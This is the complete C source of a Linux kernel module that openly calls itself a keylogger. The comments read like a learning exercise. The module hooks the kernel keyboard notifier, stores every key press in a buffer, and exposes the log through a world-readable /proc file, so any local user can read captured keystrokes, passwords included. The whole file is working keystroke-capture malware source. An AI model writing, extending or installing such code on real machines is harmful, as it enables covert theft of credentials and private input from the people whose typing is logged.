#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/keyboard.h>

#define PROC_NAME "keylogger_info"
#define STATUS_BUF_SIZE 128
#define LOG_BUF_SIZE 1024

static struct proc_dir_entry *proc_file;
static char status_buf[STATUS_BUF_SIZE] = "status: init\n";
static char last_key = '?';
static char key_buffer[LOG_BUF_SIZE]; // Buffer to store a sequence of keys
static int key_index = 0; // Tracks how many keys were stored so far

static ssize_t keylogger_read(struct file *file, char __user *buf, size_t count, loff_t *ppos) // callback function
{
    int len = key_index; // Only the bytes that were filled

    if (*ppos > 0)
    {
        return 0;
    }

    if (len == 0)
    {
        len = strlen(status_buf); // Nothing logged yet

        if (copy_to_user(buf, status_buf, len)) // Move len bytes from status_buf into the user space buf
        {
            return -EFAULT;
        }

        *ppos = len;
        return len;
    }

    if (copy_to_user(buf, key_buffer, len)) // Move the raw key log to user space
    {
        return -EFAULT;
    }

    *ppos = len;
    return len;
}

static const struct proc_ops keylogger_proc_ops =
{
    .proc_read = keylogger_read, // Tell the proc filesystem to use my read function when someone cat's the file (callback)
};

static int keylogger_cb(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param; // Cast the raw data into a keyboard event structure

    if (code == KBD_KEYSYM && param->down) // Check if the event is a valid key press (down), not a key release
    {
        last_key = (char)param->value; // Save the raw numerical value of the key

        if (key_index < LOG_BUF_SIZE - 1) // So wont corrupt memory
        {
            key_buffer[key_index] = last_key; // Append the new key to our log buffer
            key_index++;
            key_buffer[key_index] = '\0';
        }

        snprintf(status_buf, STATUS_BUF_SIZE, "last key (raw): %d\n", param->value); // Format and save the text to show the user later
    } 

    return NOTIFY_OK; // Tell the kernel we processed the event
}

static struct notifier_block keylogger_nb =
{
    .notifier_call = keylogger_cb // Tell the keyboard subsystem to call my callback function when a key is pressed
};

static int __init keylogger_init(void)
{
    printk(KERN_INFO "keylogger: loaded\n"); // Log a message to the kernel buffer (debug)

    snprintf(status_buf, STATUS_BUF_SIZE, "last key (raw): -1\n");
    memset(key_buffer, 0, sizeof(key_buffer)); // Start with an empty log buffer

    register_keyboard_notifier(&keylogger_nb); // Tell Linux to start sending keyboard events to my callback

    proc_file = proc_create(PROC_NAME, 0444, NULL, &keylogger_proc_ops); // 0444 - read only permissions

    return 0;
}

static void __exit keylogger_exit(void)
{
    if (proc_file)
    {
        proc_remove(proc_file);
    }

    unregister_keyboard_notifier(&keylogger_nb); // Tell Linux to stop sending me keyboard events

    printk(KERN_INFO "keylogger: unloaded\n");
}

module_init(keylogger_init); // Tell the compiler which function is the startup hook
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");